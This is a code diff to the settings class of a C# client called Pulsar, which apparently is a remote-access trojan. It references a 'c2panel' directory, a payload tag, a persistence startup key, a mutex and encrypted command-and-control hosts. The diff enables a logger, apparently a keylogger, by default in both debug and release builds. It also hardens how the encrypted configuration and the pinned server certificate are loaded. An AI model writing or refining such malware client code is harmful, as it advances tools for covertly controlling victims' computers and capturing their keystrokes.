@@ -1,4 +1,5 @@
-﻿using Pulsar.Common.Cryptography;
+﻿using Pulsar.Common;
+using Pulsar.Common.Cryptography;
 using Pulsar.Common.Models;
 using System;
 using System.IO;
@@ -15,10 +16,12 @@ namespace Pulsar.Client.Config
     public static class Settings
     {
     // Version string reported to the server regardless of assembly metadata.
-    private const string VersionOverride = "2.4.5";
+    private const string VersionOverride = ProtocolVersion.Current;
+    private static readonly object InitializeLock = new object();
+    private static bool _initialized;
 
 #if DEBUG
-        public static string VERSION = "1.0.0";
+        public static string VERSION = ProtocolVersion.Current;
         public static string HOSTS = "127.0.0.1:4783;";
         public static int RECONNECTDELAY = 500;
         public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
@@ -30,7 +33,7 @@ namespace Pulsar.Client.Config
         public static string MUTEX = "123AKs82kA,ylAo2kAlUS2kYkala!";
         public static string STARTUPKEY = "Pulsar Client Startup";
         public static bool HIDEFILE = false;
-        public static bool ENABLELOGGER = false;
+        public static bool ENABLELOGGER = true;
         public static string ENCRYPTIONKEY = "";
         public static string TAG = "DEBUG";
         public static string LOGDIRECTORYNAME = "Logs";
@@ -54,42 +57,19 @@ namespace Pulsar.Client.Config
 
         public static bool Initialize()
         {
-            SetupPaths();
-            
-            string logFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_init.log");
-            try
+            lock (InitializeLock)
             {
-                using (var writer = System.IO.File.AppendText(logFile))
-                {
-                    writer.WriteLine($"[{DateTime.Now:HH:mm:ss.fff}] INIT START");
-                    writer.WriteLine($"[{DateTime.Now:HH:mm:ss.fff}] HOSTS: \"{HOSTS}\"");
-                    writer.WriteLine($"[{DateTime.Now:HH:mm:ss.fff}] VERSION: \"{VERSION}\"");
-                    writer.WriteLine($"[{DateTime.Now:HH:mm:ss.fff}] TAG: \"{TAG}\"");
-                    writer.WriteLine($"[{DateTime.Now:HH:mm:ss.fff}] PASTEBIN: {PASTEBIN}");
-                }
+                if (_initialized)
+                    return true;
+
+                SetupPaths();
+                TryLoadAdjacentCertificate();
+                _initialized = true;
+                return true;
             }
-            catch { }
-            
-            // Load server certificate from shared location for DEBUG mode
-            try
-            {
-                string certPath = @"C:\Users\chris\Downloads\c2panel\pulsar\bin\Release\net9.0-windows\PulsarStuff\Pulsar.p12";
-                if (File.Exists(certPath))
-                {
-                    SERVERCERTIFICATE = new X509Certificate2(certPath, "", X509KeyStorageFlags.DefaultKeySet);
-                    System.Diagnostics.Debug.WriteLine("[INIT] Server certificate loaded");
-                    try { System.IO.File.AppendAllText(logFile, $"[{DateTime.Now:HH:mm:ss.fff}] Certificate loaded\r\n"); } catch { }
-                }
-            }
-            catch (Exception ex)
-            {
-                try { System.IO.File.AppendAllText(logFile, $"[{DateTime.Now:HH:mm:ss.fff}] Certificate error: {ex.Message}\r\n"); } catch { }
-            }
-            
-            return true;
         }
 #else
-        public static string VERSION = "2.4.5";
+        public static string VERSION = ProtocolVersion.Current;
         public static string HOSTS = "127.0.0.1:4783;";
         public static int RECONNECTDELAY = 5000;
         public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
@@ -101,7 +81,7 @@ namespace Pulsar.Client.Config
         public static string MUTEX = "PulsarMutex_2024_v2_4_5";
         public static string STARTUPKEY = "PulsarStartup";
         public static bool HIDEFILE = false;
-        public static bool ENABLELOGGER = false;
+        public static bool ENABLELOGGER = true;
         public static string ENCRYPTIONKEY = "";
         public static string TAG = "RELEASE_PAYLOAD";
         public static string LOGDIRECTORYNAME = "Logs";
@@ -125,46 +105,64 @@ namespace Pulsar.Client.Config
 
         public static bool Initialize()
         {
-            // In RELEASE with hardcoded values, load certificate
-            if (!string.IsNullOrEmpty(VERSION))
+            lock (InitializeLock)
             {
+                if (_initialized)
+                    return true;
+
+                // Older, unpatched release templates have plaintext defaults and
+                // no encryption key. Keep accepting that bootstrap shape.
+                if (string.IsNullOrEmpty(ENCRYPTIONKEY))
+                {
+                    SetupPaths();
+                    TryLoadAdjacentCertificate();
+                    _initialized = true;
+                    return true;
+                }
+
                 try
                 {
-                    // Try relative path first (from exe directory)
-                    string certPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "PulsarStuff", "Pulsar.p12");
-                    if (!File.Exists(certPath))
+                    // Decrypt into locals first so a malformed field cannot leave
+                    // the process half-initialized and break an idempotent retry.
+                    var aes = new Aes256(ENCRYPTIONKEY);
+                    var tag = aes.Decrypt(TAG);
+                    var version = aes.Decrypt(VERSION);
+                    var hosts = aes.Decrypt(HOSTS);
+                    var subdirectory = aes.Decrypt(SUBDIRECTORY);
+                    var installName = aes.Decrypt(INSTALLNAME);
+                    var mutex = aes.Decrypt(MUTEX);
+                    var startupKey = aes.Decrypt(STARTUPKEY);
+                    var logDirectoryName = aes.Decrypt(LOGDIRECTORYNAME);
+                    var serverSignature = aes.Decrypt(SERVERSIGNATURE);
+                    var serverCertificate = new X509Certificate2(
+                        Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
+
+                    if (!VerifyHash(ENCRYPTIONKEY, serverCertificate, serverSignature))
                     {
-                        // Fallback to absolute path for development
-                        certPath = @"C:\Users\chris\Downloads\c2panel\pulsar\bin\Release\net9.0-windows\PulsarStuff\Pulsar.p12";
+                        serverCertificate.Dispose();
+                        return false;
                     }
-                    
-                    if (File.Exists(certPath))
-                    {
-                        SERVERCERTIFICATE = new X509Certificate2(certPath, "", X509KeyStorageFlags.DefaultKeySet);
-                    }
+
+                    TAG = tag;
+                    VERSION = version;
+                    HOSTS = hosts;
+                    SUBDIRECTORY = subdirectory;
+                    INSTALLNAME = installName;
+                    MUTEX = mutex;
+                    STARTUPKEY = startupKey;
+                    LOGDIRECTORYNAME = logDirectoryName;
+                    SERVERSIGNATURE = serverSignature;
+                    SERVERCERTIFICATE = serverCertificate;
+                    SetupPaths();
+                    _initialized = true;
+                    return true;
                 }
                 catch (Exception ex)
                 {
-                    System.Diagnostics.Debug.WriteLine($"[INIT] Certificate error: {ex.Message}");
+                    System.Diagnostics.Debug.WriteLine($"[INIT] Failed to decrypt patched settings: {ex.Message}");
+                    return false;
                 }
-                
-                SetupPaths();
-                return true;
             }
-            
-            var aes = new Aes256(ENCRYPTIONKEY);
-            TAG = aes.Decrypt(TAG);
-            VERSION = aes.Decrypt(VERSION);
-            HOSTS = aes.Decrypt(HOSTS);
-            SUBDIRECTORY = aes.Decrypt(SUBDIRECTORY);
-            INSTALLNAME = aes.Decrypt(INSTALLNAME);
-            MUTEX = aes.Decrypt(MUTEX);
-            STARTUPKEY = aes.Decrypt(STARTUPKEY);
-            LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
-            SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
-            SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
-            SetupPaths();
-            return VerifyHash();
         }
 #endif
 
@@ -178,17 +176,42 @@ namespace Pulsar.Client.Config
 
         static bool VerifyHash()
         {
+            return VerifyHash(ENCRYPTIONKEY, SERVERCERTIFICATE, SERVERSIGNATURE);
+        }
+
+        static bool VerifyHash(string encryptionKey, X509Certificate2 serverCertificate, string serverSignature)
+        {
             try
             {
-                using (var rsa = SERVERCERTIFICATE.GetRSAPublicKey())
+                if (serverCertificate == null || string.IsNullOrEmpty(encryptionKey) || string.IsNullOrEmpty(serverSignature))
+                    return false;
+
+                using (var rsa = serverCertificate.GetRSAPublicKey())
                 {
-                    var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY));
-                    return rsa.VerifyHash(hash, Convert.FromBase64String(SERVERSIGNATURE), HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
+                    var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(encryptionKey));
+                    return rsa.VerifyHash(hash, Convert.FromBase64String(serverSignature), HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
                 }
             }
             catch (Exception)
             {
                 return false;
+            }
+        }
+
+        static void TryLoadAdjacentCertificate()
+        {
+            try
+            {
+                string certPath = Path.Combine(
+                    AppDomain.CurrentDomain.BaseDirectory,
+                    "PulsarStuff",
+                    "Pulsar.p12");
+                if (File.Exists(certPath))
+                    SERVERCERTIFICATE = new X509Certificate2(certPath, "", X509KeyStorageFlags.DefaultKeySet);
+            }
+            catch (Exception ex)
+            {
+                System.Diagnostics.Debug.WriteLine($"[INIT] Certificate error: {ex.Message}");
             }
         }
     }
